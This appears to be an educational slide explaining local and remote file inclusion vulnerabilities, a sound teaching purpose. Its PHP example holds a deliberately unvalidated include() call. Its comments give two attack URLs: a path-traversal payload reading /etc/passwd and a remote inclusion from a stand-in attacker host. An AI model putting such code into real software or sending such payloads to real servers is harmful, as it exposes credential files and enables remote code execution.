File System Vulnerabilities

Understanding File Inclusion

When Applications Include External Files

The Core Concept

File Inclusion vulnerabilities allow an attacker to force a web application to include a file, often leading to sensitive information disclosure or remote code execution.

  • •**Dynamic Content Loading:** Applications include files based on user input.
  • •**Lack of Validation:** Input is not properly sanitized or restricted.
  • •**Severe Impact:** Data exposure, arbitrary code execution.
Why it matters

These vulnerabilities provide a direct pathway for attackers to compromise the underlying server or steal critical data.

Vulnerable PHP Includeindex.php
<?php
  $page = $_GET['page'];

  // NO input validation or sanitization!
  // Attacker can control 'page' parameter
  include($page . '.php');
?>

// Example of normal use:
// index.php?page=home  -> includes home.php

// Example of attack:
// index.php?page=../../../../etc/passwd%00
// index.php?page=http://attacker.com/malicious.txt
Types of Inclusion

**Local File Inclusion (LFI):** Includes files from the target server's local file system.
**Remote File Inclusion (RFI):** Includes files from an external, attacker-controlled server.

Key Takeaway

File inclusion vulnerabilities are a direct result of insufficient input validation when dynamically loading files, opening doors to severe compromise.
